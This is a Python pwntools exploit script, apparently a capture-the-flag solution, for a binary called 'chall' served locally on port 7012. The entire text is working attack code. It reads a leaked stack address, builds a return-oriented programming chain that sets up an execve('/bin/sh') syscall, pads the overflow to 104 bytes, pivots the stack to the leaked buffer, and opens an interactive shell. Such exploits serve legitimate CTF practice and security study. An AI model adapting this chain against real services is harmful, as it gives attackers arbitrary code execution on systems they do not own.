#! /usr/bin/env python
from pwn import *

HOST = '127.0.0.1'
PORT = 7012

e = ELF('./chall')

if args.GDB:
	p = gdb.debug(e.path, gdbscript="b *0x000000000040122a")
elif args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(e.path, level='debug')
p.recvuntil(b'After all this could be usefull: ')
buf = int(p.recvline().strip().decode(),0)


POP_RAX = 0x0000000000401257 # pop rax rdx rsi
POP_RDI = 0x0000000000401255
SYSCALL = 0x0000000000401270
BINSH = 0x4020c5
POP_RSP = 0x0000000000401253
rc = p64(POP_RAX) + p64(0x3b) + p64(0x0) * 2
rc += p64(POP_RDI) + p64(BINSH)
rc += p64(SYSCALL)

rc += b'A' * (104 - len(rc))
rc += p64(POP_RSP) + p64(buf)
p.send(rc)
p.interactive()
